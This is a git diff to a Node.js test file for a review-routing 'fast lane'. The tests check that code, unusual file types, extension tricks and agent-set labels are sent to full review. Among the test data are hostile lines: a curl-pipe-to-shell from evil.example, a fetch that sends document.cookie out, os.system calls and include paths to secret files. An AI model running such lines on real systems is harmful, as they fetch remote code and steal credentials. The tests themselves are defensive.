@@ -5,8 +5,8 @@ import { chmodSync, copyFileSync, existsSync, mkdirSync, readFileSync, readdirSy
 import { dirname, join } from 'node:path';
 import { parseConf } from '../lib/conf.mjs';
 import {
-  RULE_REASONS, assertService, commandWords, contentFinding, decide, decideLane, fastSettings, globMatcher, judgeDiff, lanesMedian, measureTicket,
-  median, openingDecision, openingLane, pathFormOk, targetedArgv,
+  CODE_TYPES, FILE_TYPES, RULE_REASONS, assertService, commandWords, contentFinding, decide, decideLane, fastSettings, fileTypeOk, globMatcher, judgeDiff, lanesMedian, measureTicket,
+  median, openingDecision, openingFor, openingLane, pathFormOk, sharedIdentity, targetedArgv,
 } from '../lib/fast-lane.mjs';
 import { GithubTracker } from '../lib/tracker/adapters/github.mjs';
 import { LocalTracker } from '../lib/tracker/adapters/local.mjs';
@@ -55,19 +55,20 @@ test('the rules: a small text change in the safe paths stays on the fast lane; a
   assert.deepEqual({ state: judge(p, safe).state, reasons: judge(p, safe).reasons }, { state: 'fast', reasons: [] });
   const outside = p.commit(({ write: w }) => w({ 'api/server.js': 'export const x = 2;\n' }));
   assert.equal(judge(p, outside).state, 'full');
-  assert.deepEqual(judge(p, outside).reasons, ['outside_safe']);
+  assert.deepEqual(judge(p, outside).reasons, ['outside_safe', 'file_type'], 'outside the safe list, and code');
   assert.equal(judge(p, outside).offending.outside_safe, 'api/server.js');
   // With everything declared safe, a migration and a dependency still never are.
   const migrations = project();
   const sql = migrations.commit(({ write: w }) => w({ 'db/migrations/0042_add_column.sql': 'ALTER TABLE t ADD c int;\n' }));
-  assert.deepEqual(judge(migrations, sql, WIDE).reasons, ['migration']);
+  assert.deepEqual(judge(migrations, sql, WIDE).reasons, ['migration', 'file_type']);
   const declared = project();
   const schema = declared.commit(({ write: w }) => w({ 'db/schema/users.txt': 'users\n' }));
   assert.deepEqual(judge(declared, schema, WIDE).reasons, ['migration'], '[release] migration_paths count too');
   for (const file of ['package.json', 'web/package-lock.json', 'web/yarn.lock', 'requirements-dev.txt', 'Cargo.lock', 'go.sum', '.npmrc']) {
     const deps = project();
     const head = deps.commit(({ write: w }) => w({ [file]: '{"dependencies": {"left-pad": "1.0.0"}}\n' }));
-    assert.deepEqual(judge(deps, head, WIDE).reasons, ['dependency'], file);
+    // Refused as a dependency whatever its type; a type the fast lane does not take is said too.
+    assert.deepEqual(judge(deps, head, WIDE).reasons, /\.(?:json|txt)$/.test(file) ? ['dependency'] : ['dependency', 'file_type'], file);
   }
   const extra = project();
   const pinned = extra.commit(({ write: w }) => w({ 'tools/versions.txt': 'node 24\n' }));
@@ -90,7 +91,7 @@ test('a dotfile or a dot directory is matched only by a pattern that names a dot
   assert.equal(globMatcher('docs/*')('docs/.env'), false);
   const p = project({ 'docs/guide.md': 'Hello\n', 'docs/.htaccess': 'deny\n' });
   const head = p.commit(({ write: w }) => w({ 'docs/.htaccess': 'allow\n', 'docs/.env': 'K=1\n', 'docs/.eslintrc': '{}\n' }));
-  assert.deepEqual(judge(p, head).reasons, ['outside_safe']);
+  assert.deepEqual(judge(p, head).reasons, ['outside_safe', 'file_type'], 'and a dotfile is no file type the fast lane takes');
   assert.equal(judge(p, head).offending.outside_safe, 'docs/.env', 'the first dotfile is named, never a line of it');
 });
 
@@ -209,7 +210,7 @@ test('the decision is bound to the commit: a later push is judged again, a ticke
     // Eligible at one commit, extended at the next: judged again, and sent back.
     const extended = p.commit(({ write: w }) => w({ 'api/server.js': 'export const x = 2;\n' }));
     assert.equal(decide('X-1', extended, { conf: CONF, repo: p.dir }).state, 'full');
-    assert.deepEqual({ state: record().state, head: record().head, reasons: record().reasons }, { state: 'full', head: extended, reasons: ['outside_safe'] });
+    assert.deepEqual({ state: record().state, head: record().head, reasons: record().reasons }, { state: 'full', head: extended, reasons: ['outside_safe', 'file_type'] });
     const fallback = events().at(-1);
     assert.equal(fallback.kind, 'fast_lane_fallback');
     assert.match(JSON.parse(fallback.detail).first, /outside_safe: api\/server\.js/);
@@ -563,7 +564,7 @@ test('after the author\'s work, a diff outside the safe paths sends the ticket b
   f.stage({ 'server/x.mjs': 'export const x = 1;\n' });
   const done = f.session('X-5', { commit: 'feat: more than asked' });
   assert.match(done.run.stdout, /Fast lane: the rules send X-5 to the full circuit/);
-  assert.deepEqual((({ state, reasons }) => ({ state, reasons }))(f.record('X-5').fast_lane), { state: 'full', reasons: ['outside_safe'] });
+  assert.deepEqual((({ state, reasons }) => ({ state, reasons }))(f.record('X-5').fast_lane), { state: 'full', reasons: ['outside_safe', 'file_type'] });
   assert.equal(f.record('X-5').fast_lane.tests, undefined);
   assert.equal(f.events('fast_lane_fallback').length, 1);
   // The full circuit from here: its review waits for green checks again, and a reopened lane gets the usual author.
@@ -735,6 +736,13 @@ test('the example settings and the docs say every fast-lane key, and nothing fas
   const docs = readFileSync(join(import.meta.dirname, '..', 'docs', 'fast-lane.md'), 'utf8');
   assert.match(docs, /## Threat model: can a risky ticket take the fast lane\?/);
   assert.match(docs, /## What never qualifies/);
+  const reference = readFileSync(join(import.meta.dirname, '..', 'docs', 'configuration.md'), 'utf8');
+  for (const key of ['file_types', 'extra_file_types', 'trust_label_without_actor']) {
+    assert.match(example, new RegExp(`\\n${key} =`), key);
+    assert.match(reference, new RegExp(`\\| \`${key}\` \\|`), key);
+  }
+  // The example's settings are readable, and its file types are the built-in list.
+  assert.deepEqual([...fastSettings(parseConf(example)).types], FILE_TYPES);
 });
 
 // ---- What lands, not what the branch says: the merge the forge would make ----
@@ -782,7 +790,7 @@ test('adversarial: a criss-cross history (two merge bases) is not judged; a merg
   s.git('checkout', '-q', 'dev/X-1');
   s.git('merge', '-q', '--no-ff', '-m', 'bring main in', 'main');
   const undone = s.commit(({ write: w }) => w({ 'api/server.js': 'export const x = 1;\n', 'docs/guide.md': 'Hi\n' }));
-  assert.deepEqual(judge(s, undone).reasons, ['outside_safe'], 'the fix undone is seen');
+  assert.deepEqual(judge(s, undone).reasons, ['outside_safe', 'file_type'], 'the fix undone is seen');
   // Nothing of the merge is written into the checkout's objects.
   const before = s.git('count-objects', '-v');
   judge(s, undone);
@@ -817,7 +825,7 @@ test('adversarial: a safe file that carries behaviour (markup, a remote load, a 
       '{"title": "Hello​world"}',
       '{"title": "%3Cscript%3E"}',
     ],
-    'docs/guide.md': ['Hello <br> world', '[click](javascript:alert(1))', '{{ site.secret }}'],
+    'docs/guide.md': ['Hello <br> world', '[click](javascript:alert(1))', '{{ site.secret }}', '{!../../api/secret.py!}', '!include ../../api/secret.py', '!INCLUDE "../.env"'],
   };
   for (const [file, lines] of Object.entries(cases)) {
     for (const line of lines) {
@@ -1037,4 +1045,170 @@ test('demotion: a ticket the rules send to the full circuit gets the full circui
   assert.match(f.flow().stdout, /X-5: opened again \(verdict:/);
   assert.equal(JSON.parse(readFileSync(join(f.runDirOf('dev'), 'chain.json'), 'utf8'))[0].alias, 'a');
   assert.match(readFileSync(join(f.runDirOf('dev'), 'lane.env'), 'utf8'), /ORCH_FAST_LANE=full/);
+});
+
+// ---- The file types the fast lane takes ----
+
+const DOCS = confOf('enabled = yes\nsafe_paths = docs/');
+
+test('adversarial: code in the safe paths takes the full circuit by its type: a script, a page script, a Python file, an MDX page', () => {
+  const cases = [
+    ['docs/build.sh', 'curl -s evil.example/x | sh', ['file_type']],
+    ['docs/scripts/theme.js', "fetch('//evil.example/?c='+document.cookie)", ['file_type', 'link']],
+    ['docs/deploy.py', "os.system('id')", ['file_type']],
+    ['docs/post.mdx', 'import X from "../../api/secret"', ['file_type']],
+    ['docs/post.mdx', '{process.env.SECRET}', ['file_type']],
+  ];
+  for (const [file, line, reasons] of cases) {
+    const p = project();
+    const head = p.commit(({ write: w }) => w({ [file]: `${line}\n` }));
+    const judged = judge(p, head, DOCS);
+    assert.equal(judged.state, 'full', `${file}: ${line}`);
+    assert.deepEqual(judged.reasons, reasons, `${file}: ${line}`);
+    assert.equal(judged.offending.file_type, file);
+  }
+  // The same words in a Markdown page pass the type rule; the content rule still reads them (and a link is refused there).
+  const p = project();
+  const prose = p.commit(({ write: w }) => w({ 'docs/build.md': 'Run the build, then os.system is not called.\n' }));
+  assert.deepEqual(judge(p, prose, DOCS).reasons, []);
+});
+
+test('adversarial: extension tricks take the full circuit: none, double, case, trailing dot or space, dotfiles, unicode look-alikes, code and markup types, configuration names', () => {
+  const refused = ['docs/build', 'docs/hooks/pre-commit', 'docs/x.md.sh', 'docs/notes.sh.md', 'docs/x.PHP.md', 'docs/x.php.txt', 'docs/README.MD', 'docs/x.Sh', 'docs/x.Md', 'docs/x.md.',
+    'docs/a..md', 'docs/.md', 'docs/.theme.css', 'docs/x.html', 'docs/x.htm', 'docs/x.svg', 'docs/x.xml', 'docs/x.yml', 'docs/x.yaml', 'docs/x.ts', 'docs/x.mjs', 'docs/x.cjs',
+    'docs/x.jsx', 'docs/x.tsx', 'docs/x.vue', 'docs/x.rst', 'docs/x.csv', 'docs/x.toml', 'docs/x.njk', 'docs/x.liquid', 'docs/x.scss', 'docs/x.json5', 'docs/tsconfig.json',
+    'docs/tsconfig.build.json', 'docs/site.config.json', 'docs/vercel.json', 'docs/manifest.json', 'docs/robots.txt', 'docs/CMakeLists.txt', 'docs/x.lock'];
+  const unicode = ['docs/x.ｍｄ', 'docs/x.mԁ', 'docs/x.md​', 'docs/x.md ', 'docs/x.md ', 'docs/x․md', 'docs/x.ꜱh'];
+  for (const file of [...refused, ...unicode]) assert.equal(fileTypeOk(file, new Set(FILE_TYPES)), false, JSON.stringify(file));
+  for (const file of refused) {
+    const p = project();
+    const head = p.commit(({ write: w }) => w({ [file]: 'text\n' }));
+    const judged = judge(p, head, DOCS);
+    assert.equal(judged.state, 'full', file);
+    assert.ok(judged.reasons.includes('file_type') || (file === 'docs/.md' || file === 'docs/.theme.css'), `${file}: ${judged.reasons}`);
+  }
+  // A dotfile is not even in the safe paths ("docs/" holds none); named there, the type rule still refuses it.
+  const dotted = project();
+  const theme = dotted.commit(({ write: w }) => w({ 'docs/.theme.css': 'h1 { color: red; }\n' }));
+  assert.deepEqual(judge(dotted, theme, confOf('enabled = yes\nsafe_paths = docs/, docs/.*')).reasons, ['file_type']);
+  // A name git keeps as bytes the rules cannot read is the full circuit too, by its form or its type.
+  for (const file of unicode) {
+    const p = project();
+    const head = p.commit(({ write: w }) => w({ [file]: 'text\n' }));
+    const judged = judge(p, head, DOCS);
+    assert.equal(judged.state, 'full', JSON.stringify(file));
+    assert.ok(judged.reasons.includes('path_form') || judged.reasons.includes('file_type'), `${JSON.stringify(file)}: ${judged.reasons}`);
+  }
+  // Prose, styles and translations stay fast, with a locale or a module part in the name.
+  const allowed = ['docs/a.md', 'docs/b.markdown', 'docs/c.txt', 'docs/d.css', 'docs/e.json', 'docs/f.po', 'docs/guide.fr.md', 'docs/Button.module.css', 'docs/messages.pt-BR.json'];
+  for (const file of allowed) assert.equal(fileTypeOk(file, new Set(FILE_TYPES)), true, file);
+  const p = project();
+  const plain = p.commit(({ write: w }) => w(Object.fromEntries(allowed.slice(0, 6).map((file) => [file, 'Hello\n']))));
+  assert.deepEqual(judge(p, plain, confOf('enabled = yes\nsafe_paths = docs/\nmax_files = 10')).reasons, []);
+});
+
+test('the file types can be narrowed; widened only by extra_file_types, never to a type that runs; lock files, manifests, git files and hooks stay refused whatever the types', () => {
+  assert.deepEqual(FILE_TYPES, ['md', 'markdown', 'txt', 'css', 'json', 'po']);
+  for (const type of FILE_TYPES) assert.equal(CODE_TYPES.has(type), false, type);
+  const p = project();
+  const text = p.commit(({ write: w }) => w({ 'docs/notes.txt': 'Hello\n' }));
+  // Narrowed: prose in Markdown only.
+  assert.deepEqual(judge(p, text, confOf('enabled = yes\nsafe_paths = docs/\nfile_types = md, markdown')).reasons, ['file_type']);
+  // file_types never widens: a type outside the built-in list refuses the settings, and nothing is fast.
+  for (const narrow of ['sh', 'csv', 'md, js', '.md', 'MD']) {
+    const conf = confOf(`enabled = yes\nsafe_paths = docs/\nfile_types = ${narrow}`);
+    assert.throws(() => fastSettings(conf), /\[fast_lane\]/, narrow);
+    assert.deepEqual(judge(p, text, conf).reasons, ['settings'], narrow);
+  }
+  // extra_file_types widens, explicitly, but never to a type that runs, is interpreted or configures something.
+  const q = project();
+  const table = q.commit(({ write: w }) => w({ 'docs/prices.csv': 'name,price\nTea,3\n' }));
+  assert.deepEqual(judge(q, table, DOCS).reasons, ['file_type']);
+  assert.deepEqual(judge(q, table, confOf('enabled = yes\nsafe_paths = docs/\nextra_file_types = csv')).reasons, []);
+  for (const extra of ['sh', 'js', 'mjs', 'ts', 'jsx', 'py', 'mdx', 'html', 'svg', 'xml', 'yml', 'yaml', 'rst', 'toml', 'php', 'csv, Sh', 'md.sh', '']) {
+    const conf = confOf(`enabled = yes\nsafe_paths = docs/\nextra_file_types = ${extra}`);
+    if (extra === '') { assert.equal(fastSettings(conf).types.size, FILE_TYPES.length); continue; }
+    assert.throws(() => fastSettings(conf), /extra_file_types|not a file type/, extra);
+  }
+  // Whatever the types, the built-in lists still refuse lock files, manifests, git files and hooks.
+  const wide = confOf('enabled = yes\nsafe_paths = **, .*, .husky/*, .git*\nmax_lines = 400\nmax_files = 50\nextra_file_types = csv, lockfile');
+  for (const [file, reason] of [['package.json', 'dependency'], ['web/composer.json', 'dependency'], ['yarn.lock', 'dependency'], ['deps.lockfile', 'dependency'],
+    ['.gitattributes', 'protected'], ['docs/.gitmodules', 'protected'], ['.husky/pre-commit', 'protected'], ['.githooks/pre-push', 'protected'], ['requirements.txt', 'dependency']]) {
+    const one = project();
+    const changed = one.commit(({ write: w }) => w({ [file]: 'changed\n' }));
+    const judged = judge(one, changed, wide);
+    assert.equal(judged.state, 'full', file);
+    assert.ok(judged.reasons.includes(reason), `${file}: ${judged.reasons}`);
+  }
+  // The card says it in words, in both languages.
+  return import('../lib/i18n.mjs').then(({ message }) => {
+    assert.match(message('app_srv_fast_reason_file_type', 'en'), /type the fast lane does not take/);
+    assert.match(message('app_srv_fast_reason_file_type', 'fr'), /type que la voie rapide ne prend pas/);
+  });
+});
+
+// ---- A tracker that cannot tell the user from an agent ----
+
+test('shared identity at opening: under the user\'s own key a label he seems to have set is ignored, unless the owner said separate_identity = no or opted in; an application tells them apart; an agent\'s label is never taken', () => {
+  const human = { kind: 'human', id: 'alice' };
+  const agents = { kind: 'agents', id: 'cleared[bot]' };
+  const issue = { identifier: 'X-1', labels: ['Quick'], project: null };
+  const confWith = (merge, fast = '') => parseConf(`[merge]\n${merge}\n[fast_lane]\nenabled = yes\nlabels = Quick\nsafe_paths = docs/\n${fast}\n`);
+  const open = (conf, identity, by) => {
+    let asked = 0;
+    const decision = openingFor(conf, fastSettings(conf), issue, { identity: () => { asked += 1; return identity; }, actorsOf: () => ({ labels: { Quick: by }, project: null }) });
+    return { ...decision, asked };
+  };
+  const required = confWith('separate_identity = required');
+  // The merge's own rule, read the same way.
+  assert.equal(sharedIdentity(required, 'app'), false);
+  assert.equal(sharedIdentity(required, 'shared'), true);
+  assert.equal(sharedIdentity(required, 'unknown'), true, 'an identity that cannot be read is not an application');
+  assert.equal(sharedIdentity(confWith(''), 'shared'), true, 'unset is required');
+  assert.equal(sharedIdentity(confWith('separate_identity = no'), 'shared'), false);
+  // Shared key: the label is ignored, and said.
+  const shared = open(required, 'shared', human);
+  assert.equal(shared.lane, 'full');
+  assert.match(shared.ignored[0], /^label Quick \(set under the key the agents share with the user: the tracker cannot say who set it/);
+  assert.equal(open(required, 'unknown', human).lane, 'full');
+  // An application of the agents: the user's label is his.
+  assert.deepEqual(open(required, 'app', human), { lane: 'fast', ignored: [], asked: 1 });
+  // The owner accepts a shared key ([merge] separate_identity = no), as the merge does: the label is taken as the tracker says.
+  assert.equal(open(confWith('separate_identity = no'), 'shared', human).lane, 'fast');
+  // Opted in to marks nobody can attribute: taken.
+  assert.equal(open(confWith('separate_identity = required', 'trust_label_without_actor = yes'), 'shared', human).lane, 'fast');
+  // An agent's label is never taken: with an application, under a shared key, opted in or with separate_identity = no.
+  for (const [conf, identity] of [[required, 'app'], [required, 'shared'], [confWith('separate_identity = required', 'trust_label_without_actor = yes'), 'shared'],
+    [confWith('separate_identity = required', 'trust_label_without_actor = yes'), 'app'], [confWith('separate_identity = no', 'trust_label_without_actor = yes'), 'shared']]) {
+    const forged = open(conf, identity, agents);
+    assert.equal(forged.lane, 'full', identity);
+    assert.match(forged.ignored[0], /set by agents/);
+  }
+  // A ticket with no fast mark asks the tracker nothing.
+  const conf = required;
+  let asked = 0;
+  assert.deepEqual(openingFor(conf, fastSettings(conf), { identifier: 'X-1', labels: ['Bug'] }, { identity: () => { asked += 1; return 'app'; }, actorsOf: () => { asked += 1; return null; } }), { lane: 'full', ignored: [] });
+  assert.equal(asked, 0);
+});
+
+test('shared identity at opening, end to end: under a shared key a lane opened by hand takes the full circuit despite the user\'s label, and fast_lane_mark_ignored says why; with an application the label opens the fast lane', () => {
+  const shared = fastFlow();
+  writeFileSync(join(shared.box.home, 'tracker-identity'), 'shared\n');
+  shared.todo(['X-5']);
+  shared.by('X-5', 0);
+  // The wake opens nothing from Todo under a shared key (flow-lanes.sh); a lane opened by hand (spawn-lane.sh) reads the label the same way.
+  assert.match(shared.flow().stdout, /the tracker cannot tell the user from an agent: no lane is opened/);
+  const spawned = spawnSync(join(shared.box.home, 'spawn-lane.sh'), ['dev', 'X-5', '--comment-on', 'none'], { env: shared.env, encoding: 'utf8' });
+  assert.equal(spawned.status, 0, spawned.stderr);
+  assert.deepEqual((({ opening, state }) => ({ opening, state }))(shared.record('X-5').fast_lane), { opening: 'full', state: 'full' });
+  assert.equal(shared.events('fast_lane_opened').length, 0);
+  assert.match(shared.events('fast_lane_mark_ignored')[0].detail, /label Quick \(set under the key the agents share with the user: the tracker cannot say who set it/);
+  assert.equal(JSON.parse(readFileSync(join(shared.runDirOf('dev'), 'chain.json'), 'utf8'))[0].alias, 'a', 'the routing table\'s author, not the light one');
+  const app = fastFlow();
+  writeFileSync(join(app.box.home, 'tracker-identity'), 'app\n');
+  app.todo(['X-5']);
+  app.by('X-5', 0);
+  app.flow();
+  assert.equal(app.record('X-5').fast_lane.opening, 'fast');
+  assert.equal(app.events('fast_lane_mark_ignored').length, 0);
 });
